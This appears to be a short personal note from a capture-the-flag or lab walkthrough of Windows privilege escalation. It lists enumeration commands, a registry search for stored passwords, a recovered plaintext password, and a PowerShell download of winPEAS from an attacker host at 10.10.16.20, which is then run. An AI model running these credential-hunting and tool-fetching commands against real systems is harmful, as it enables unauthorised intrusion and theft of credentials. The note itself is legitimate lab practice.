
![[Pasted image 20240502020942.png]]


```
net user
```
![[Pasted image 20240502021215.png]]

```
netsh firewall show state
```
![[Pasted image 20240502021554.png]]


```
reg query HKLM /f password /t REG_SZ /s
```
![[Pasted image 20240502021900.png]]

```
Moneymakestheworldgoround!
```

Let's run winpeas and see what we can find
```
IWR -Uri http://10.10.16.20:8080/winPEASx64.exe -OutFile winPEASx64.exe
```

I tried running x86 but in the end x64 worked which means that the system is x64
```
./winPEASx64.exe
```

![[Pasted image 20240502022922.png]]
![[Pasted image 20240502024020.png]]
I guess this password is not working

![[Pasted image 20240502024103.png]]

